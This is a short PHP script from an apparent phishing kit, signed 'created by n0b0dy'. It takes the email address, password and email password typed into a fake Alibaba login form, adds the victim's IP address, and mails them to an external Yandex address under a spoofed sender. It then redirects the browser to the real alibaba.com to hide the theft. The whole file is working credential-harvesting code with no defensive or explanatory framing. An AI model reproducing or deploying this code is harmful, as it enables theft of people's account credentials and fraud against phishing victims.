<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------ReSulT--------------------\n";
$message .= "Email Add  : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Emailpwd : ".$_POST['pwd']."\n";
$message .= "-------------created by n0b0dy-------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------ReSulT--------------------\n";
$send = "worx.box@yandex.ru";
$subject = "ReSulTs - AlI";
$headers = "From: ReSult<mtseason@ecok.eu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://www.alibaba.com/";
</script>